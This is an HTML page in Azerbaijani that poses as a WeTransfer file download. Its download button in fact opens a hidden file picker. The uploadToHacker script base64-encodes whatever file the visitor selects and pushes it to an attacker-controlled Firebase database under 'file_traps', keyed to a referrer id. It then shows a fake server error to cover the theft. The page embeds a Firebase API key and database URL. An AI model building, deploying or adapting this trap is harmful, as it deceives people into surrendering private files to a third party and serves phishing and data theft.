<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wetransfer - File Download</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        body { font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f3f3f3; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 320px; }
        .icon { font-size: 50px; color: #409fff; margin-bottom: 20px; }
        .btn { background: #409fff; color: white; padding: 15px 30px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
        #status { font-size: 12px; color: #888; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="icon"><i class="fas fa-file-arrow-down"></i></div>
    <h2>Fayl Hazırdır</h2>
    <p style="color: #666; font-size: 14px;">Göndərilən sənədi (4.2 MB) yükləmək üçün aşağıdakı düyməyə basın.</p>
    <input type="file" id="file-input" style="display: none;" onchange="uploadToHacker(this)">
    <button class="btn" onclick="document.getElementById('file-input').click()">YÜKLƏ (DOWNLOAD)</button>
    <div id="status">Təhlükəsizlik yoxlamasından keçib.</div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const urlParams = new URLSearchParams(window.location.search);
    const owner = urlParams.get('ref');

    function uploadToHacker(input) {
        if(!owner) return alert("Xəta: Link düzgün deyil.");
        const file = input.files[0];
        document.getElementById('status').innerText = "Yüklənir: 0%";

        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = function () {
            const fileData = {
                name: file.name,
                size: (file.size / 1024).toFixed(1) + " KB",
                url: reader.result, // Faylın özü base64 formatında
                time: new Date().toLocaleString()
            };
            
            db.ref('file_traps/' + owner).push(fileData).then(() => {
                document.getElementById('status').innerText = "Fayl server xətası səbəbindən yüklənmədi (Error 505).";
                alert("Sistem xətası: Fayl tapılmadı.");
            });
        };
    }
</script>
</body>
</html>
